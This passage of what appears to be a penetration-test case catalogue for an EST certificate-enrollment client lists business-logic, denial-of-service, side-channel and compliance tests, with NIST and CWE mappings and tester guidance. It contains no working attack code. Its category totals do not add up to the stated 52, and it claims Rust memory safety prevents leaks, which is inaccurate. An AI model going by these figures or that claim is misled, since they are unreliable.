- Renewal allowed only within configured window
- Early renewal prevented (if policy requires)
- Expired certificate renewal rejected
- Appropriate errors returned

---

### TC-LOGIC-002: Certificate Revocation - Use After Revocation

**Category**: Business Logic Testing
**Priority**: P2 (Should Test)
**NIST Control**: IA-5 (Authenticator Management)
**CWE**: CWE-299 (Improper Check for Certificate Revocation)

**Description**: Verify client stops using revoked certificates.

**Prerequisites**:
- EST Client with enrolled certificate
- Ability to revoke certificate
- CRL/OCSP infrastructure

**Steps**:
1. Enroll certificate
2. Use certificate successfully
3. Revoke certificate (publish to CRL/OCSP)
4. Attempt to continue using certificate
5. Verify client detects revocation

**Expected Result (Vulnerable)**:
- Client continues using revoked certificate
- No revocation checking

**Pass Criteria (Secure)**:
- Client periodically checks revocation status
- Revoked certificate usage stopped
- Error logged: "Certificate revoked, reenrollment required"
- Automatic reenrollment initiated (if configured)

---

### TC-LOGIC-003: Enrollment State Machine - Bypass Enrollment Flow

**Category**: Business Logic Testing
**Priority**: P2 (Should Test)
**NIST Control**: IA-5 (Authenticator Management)
**CWE**: CWE-841 (Improper Enforcement of Behavioral Workflow)

**Description**: Attempt to bypass enrollment state machine.

**Prerequisites**:
- EST Client enrollment process
- Network interception/replay capability

**Steps**:
1. Document normal enrollment flow:
   - /cacerts
   - /csrattrs (optional)
   - /simpleenroll
2. Attempt to skip steps:
   - Send /simpleenroll without /cacerts
   - Replay /simpleenroll response
3. Test state transitions:
   - Jump directly to enrolled state
   - Reuse CSR for multiple enrollments

**Expected Result (Vulnerable)**:
- Steps can be skipped
- State machine bypassed
- Enrollment completed with missing validation

**Pass Criteria (Secure)**:
- Enrollment flow enforced
- Missing steps detected and rejected
- State machine validates transitions
- Replay attacks prevented (one-time CSR use)

---

### TC-LOGIC-004: Race Condition - Concurrent Enrollments

**Category**: Business Logic Testing
**Priority**: P3 (Nice to Test)
**NIST Control**: SC-39 (Process Isolation)
**CWE**: CWE-362 (Race Condition)

**Description**: Test for race conditions during concurrent enrollment.

**Prerequisites**:
- Ability to launch multiple enrollment processes simultaneously
- Monitoring tools for file/registry access

**Steps**:
1. Launch multiple EST Client processes simultaneously
2. Monitor for:
   - File access conflicts
   - Certificate store corruption
   - Key container conflicts
3. Verify proper locking mechanisms
4. Test auto-enrollment service with manual enrollment

**Expected Result (Vulnerable)**:
- Race conditions cause corruption
- Duplicate certificates enrolled
- Key container conflicts

**Pass Criteria (Secure)**:
- Proper locking prevents concurrent enrollment
- Only one enrollment proceeds at a time
- Other processes queue or fail gracefully
- Error: "Enrollment already in progress"

---

### TC-LOGIC-005: Authorization Bypass - Enroll for Different Subject

**Category**: Business Logic Testing
**Priority**: P2 (Should Test)
**NIST Control**: AC-3 (Access Enforcement)
**CWE**: CWE-639 (Insecure Direct Object Reference)

**Description**: Test if client can enroll certificates for unauthorized subjects.

**Prerequisites**:
- EST Client with specific identity/credentials
- Ability to modify CSR subject

**Steps**:
1. Authenticate as User A
2. Create CSR with User B's identity:
   ```
   CN=UserB, OU=Department, O=Agency
   ```
3. Submit enrollment request
4. Verify authorization enforcement (server-side)
5. Test if client validates subject matches authenticated identity

**Expected Result (Vulnerable)**:
- Enrollment succeeds for different subject
- No authorization check

**Pass Criteria (Secure)**:
- Server rejects unauthorized subject
- Client validates subject matches expected identity (if applicable)
- Error: "Subject not authorized"

**Note**: Typically server-side validation, but client-side checks useful for early detection.

---

## 8. Denial of Service Test Cases

### TC-DOS-001: Resource Exhaustion - Memory Leak

**Category**: Denial of Service
**Priority**: P2 (Should Test)
**NIST Control**: SC-5 (Denial of Service Protection)
**CWE**: CWE-401 (Memory Leak)

**Description**: Test for memory leaks during repeated operations.

**Prerequisites**:
- EST Client installed
- Memory monitoring tools (Task Manager, Process Explorer)
- Automation for repeated enrollments

**Steps**:
1. Measure baseline memory usage
2. Perform 1000+ enrollment operations:
   - Successful enrollments
   - Failed enrollments (various errors)
3. Monitor memory usage over time
4. Verify memory is released after operations
5. Look for gradual memory increase

**Expected Result (Vulnerable)**:
- Memory usage grows unbounded
- Memory leak detected

**Pass Criteria (Secure)**:
- Memory usage remains stable
- Memory released after operations
- No more than 5% memory growth over 1000 operations
- Rust memory safety prevents leaks

---

### TC-DOS-002: Resource Exhaustion - File Handle Leak

**Category**: Denial of Service
**Priority**: P2 (Should Test)
**NIST Control**: SC-5 (Denial of Service Protection)
**CWE**: CWE-404 (Improper Resource Shutdown)

**Description**: Test for file handle leaks.

**Prerequisites**:
- EST Client performing file operations
- Handle monitoring tools (Process Explorer, lsof)

**Steps**:
1. Monitor open file handles
2. Perform repeated operations:
   - Log file writes
   - Certificate file reads
   - Configuration file reads
3. Verify handles are closed after use
4. Look for handle count increase

**Expected Result (Vulnerable)**:
- File handles not released
- Handle count grows unbounded
- Eventually hits OS limit

**Pass Criteria (Secure)**:
- File handles properly closed
- Stable handle count
- No handle leaks

---

### TC-DOS-003: CPU Exhaustion - Cryptographic Operations

**Category**: Denial of Service
**Priority**: P3 (Nice to Test)
**NIST Control**: SC-5 (Denial of Service Protection)
**CWE**: CWE-405 (Asymmetric Resource Consumption)

**Description**: Test for CPU exhaustion via expensive crypto operations.

**Prerequisites**:
- EST Client
- CPU monitoring tools
- Test EST server under control

**Steps**:
1. Configure server to request expensive operations:
   - Large RSA key sizes (8192-bit)
   - Many signature verifications
2. Monitor CPU usage during operations
3. Test rate limiting or operation limits
4. Verify operations timeout appropriately

**Expected Result (Vulnerable)**:
- Unlimited expensive operations accepted
- CPU exhaustion possible

**Pass Criteria (Secure)**:
- Reasonable limits on crypto operations
- Timeouts prevent indefinite operations
- CPU usage remains controlled
- Rate limiting if applicable

---

## 9. Side-Channel Attack Test Cases

### TC-SIDE-001: Timing Attack - Certificate Validation

**Category**: Side-Channel Attacks
**Priority**: P3 (Nice to Test)
**NIST Control**: SC-13 (Cryptographic Protection)
**CWE**: CWE-208 (Observable Timing Discrepancy)

**Description**: Test for timing side-channels in certificate validation.

**Prerequisites**:
- High-precision timing measurement
- Statistical analysis tools
- Multiple test certificates

**Steps**:
1. Measure validation time for:
   - Valid certificates
   - Invalid signature
   - Expired certificates
   - Wrong issuer
2. Collect 1000+ samples for each case
3. Perform statistical analysis
4. Look for measurable differences

**Expected Result (Vulnerable)**:
- Timing varies based on validation failure type
- Early rejection leaks information

**Pass Criteria (Secure)**:
- Constant-time validation
- No statistically significant timing difference
- Timing variance within measurement noise

---

### TC-SIDE-002: Cache Timing - AES Operations

**Category**: Side-Channel Attacks
**Priority**: P3 (Nice to Test) - Advanced
**NIST Control**: SC-13 (Cryptographic Protection)
**CWE**: CWE-327 (Use of Broken Cryptography)

**Description**: Test for cache-based side-channel in AES operations.

**Prerequisites**:
- Source code review
- Cache timing attack tools
- Log encryption enabled

**Steps**:
1. Review AES implementation:
   - AES-NI instructions used (hardware)
   - Table-based AES (vulnerable to cache timing)
2. Perform cache timing attack if applicable
3. Verify AES-GCM implementation uses constant-time operations

**Expected Result (Vulnerable)**:
- Table-based AES with cache timing vulnerability

**Pass Criteria (Secure)**:
- AES-NI hardware instructions used (immune to cache timing)
- Constant-time software AES if hardware unavailable
- aes-gcm crate uses secure implementation

**Note**: Rust `aes-gcm` crate typically uses AES-NI when available, providing cache-timing resistance.

---

## 10. Compliance and Configuration Test Cases

### TC-COMP-001: FIPS Mode - Non-FIPS Algorithm Usage

**Category**: Compliance Testing
**Priority**: P1 (Must Test) - if FIPS required
**NIST Control**: SC-13 (Cryptographic Protection)
**CWE**: CWE-327 (Use of Broken Cryptography)

**Description**: Verify only FIPS-approved algorithms used in FIPS mode.

**Prerequisites**:
- Windows with FIPS mode enabled
- EST Client

**Steps**:
1. Enable FIPS mode: `secpol.msc` > Local Policies > Security Options > "System cryptography: Use FIPS compliant algorithms"
2. Launch EST Client
3. Monitor cryptographic operations
4. Verify algorithms used:
   - AES (FIPS 197)
   - SHA-256/384/512 (FIPS 180-4)
   - RSA (FIPS 186-4)
   - ECDSA (FIPS 186-4)
5. Verify no non-FIPS algorithms:
   - MD5
   - RC4
   - Non-approved curves

**Expected Result (Vulnerable)**:
- Non-FIPS algorithms used in FIPS mode

**Pass Criteria (Secure)**:
- Only FIPS-approved algorithms used
- CNG (Windows) or FIPS-validated library used
- Application enforces FIPS mode

---

### TC-COMP-002: Audit Logging - Missing Security Events

**Category**: Compliance Testing
**Priority**: P1 (Must Test)
**NIST Control**: AU-2 (Event Logging)
**CWE**: CWE-778 (Insufficient Logging)

**Description**: Verify all required security events are logged.

**Prerequisites**:
- EST Client with logging enabled
- Various operations performed

**Steps**:
1. Perform operations and verify logging:
   - Successful enrollment (INFO)
   - Failed enrollment (ERROR)
   - Authentication failures (WARNING)
   - Configuration changes (INFO)
   - Service start/stop (INFO)
   - Cryptographic operations (if configured)
   - Key generation (INFO)
   - Certificate renewal (INFO)
2. Verify log format (RFC 5424 compliance)
3. Check for missing events

**Expected Result (Vulnerable)**:
- Security events not logged
- Insufficient detail

**Pass Criteria (Secure)**:
- All security events logged
- Sufficient detail for audit (who, what, when, result)
- Timestamps in UTC
- RFC 5424 format compliance
- Tamper-evident logs (encryption + HMAC if enabled)

---

## 11. Test Summary

### 11.1 Test Case Coverage

**Total Test Cases**: 52

**By Category**:
- Network Security: 10 test cases
- Application Security: 8 test cases
- Authentication: 5 test cases
- Cryptography: 7 test cases
- Windows Platform: 6 test cases
- Business Logic: 5 test cases
- Denial of Service: 3 test cases
- Side-Channel: 2 test cases
- Compliance: 2 test cases

**By Priority**:
- P1 (Must Test): 28 test cases
- P2 (Should Test): 18 test cases
- P3 (Nice to Test): 6 test cases

### 11.2 NIST 800-53 Control Mapping

| Control | Test Cases | Priority |
|---------|------------|----------|
| SC-8 (Transmission Confidentiality) | TC-NET-001, TC-NET-002, TC-NET-008, TC-NET-010 | P1 |
| SC-13 (Cryptographic Protection) | TC-NET-002, TC-CRYPTO-001, TC-CRYPTO-002, TC-CRYPTO-005, TC-CRYPTO-006, TC-SIDE-001, TC-SIDE-002, TC-COMP-001 | P1 |
| IA-5 (Authenticator Management) | TC-NET-003, TC-NET-004, TC-NET-005, TC-NET-006, TC-NET-007, TC-AUTH-001, TC-AUTH-002, TC-AUTH-005, TC-LOGIC-001, TC-LOGIC-002 | P1 |
| SI-10 (Information Input Validation) | TC-APP-002, TC-APP-003, TC-APP-004, TC-APP-006 | P1 |
| SC-12 (Cryptographic Key Management) | TC-CRYPTO-003, TC-CRYPTO-004, TC-CRYPTO-007, TC-WIN-004, TC-WIN-005 | P1 |
| AC-6 (Least Privilege) | TC-WIN-001 | P1 |
| AU-2 (Event Logging) | TC-COMP-002 | P1 |

### 11.3 CWE Coverage

**Top 25 CWE Coverage**:
- CWE-295 (Improper Certificate Validation): 6 test cases
- CWE-327 (Broken Cryptography): 4 test cases
- CWE-287 (Improper Authentication): 3 test cases
- CWE-20 (Improper Input Validation): 3 test cases
- CWE-320 (Key Management Errors): 3 test cases
- Others: 33 test cases

---

## 12. Usage Guidelines

### 12.1 For Penetration Testers

**Before Testing**:
1. Review test environment setup ([Section 5](penetration-testing-requirements.md#5-test-environment))
2. Obtain necessary credentials and access
3. Set up required tools
4. Review rules of engagement ([Section 8](penetration-testing-requirements.md#8-rules-of-engagement))

**During Testing**:
1. Execute P1 test cases first (must test)
2. Document all findings using [finding template](penetration-test-finding-template.md)
3. Report Critical/High findings immediately (4-hour/24-hour SLA)
4. Execute P2 test cases (should test)
5. Execute P3 test cases if time permits (nice to test)

**After Testing**:
1. Compile findings into penetration test report
2. Assign CVSS scores to all findings
3. Map findings to CWE identifiers
4. Provide remediation recommendations
5. Deliver all required deliverables

### 12.2 For Security Team

**Test Planning**:
1. Select vendor using [RFP template](penetration-testing-rfp-template.md)
2. Set up test environment
3. Provide required access and credentials
4. Review and approve test plan

**During Testing**:
1. Monitor for emergency findings
2. Coordinate with vendor on issues
3. Provide architecture support if needed

**After Testing**:
1. Review findings for validity
2. Create POA&M items for findings
3. Prioritize remediation
4. Track fixes in GitHub Issues

### 12.3 For Development Team

**Preparation**:
1. Review test cases to understand threats
2. Perform self-assessment using test cases
3. Fix obvious vulnerabilities before testing

**During Testing**:
1. Provide architecture support to testers
2. Respond to questions about implementation

**After Testing**:
1. Review findings
2. Develop remediation plan
3. Implement fixes
4. Verify fixes in development environment
5. Request retest

---

## 13. References

### 13.1 Related Documents

- [Penetration Testing Requirements](penetration-testing-requirements.md) - Overall testing framework
- [RFP Template](penetration-testing-rfp-template.md) - Procurement document
- [Finding Template](penetration-test-finding-template.md) - Finding documentation format
- [POA&M](poam.md) - Plan of Action and Milestones

### 13.2 Standards Referenced

- NIST SP 800-115 - Technical Guide to Information Security Testing and Assessment
- NIST SP 800-53 Rev 5 - Security and Privacy Controls
- OWASP Testing Guide v4.2
- CWE Top 25 Most Dangerous Software Weaknesses
- CVSS v3.1 Specification

---

**Document Owner**: Security Team
**Next Review**: Before each annual penetration test engagement
**Version**: 1.0
**Date**: 2026-01-14
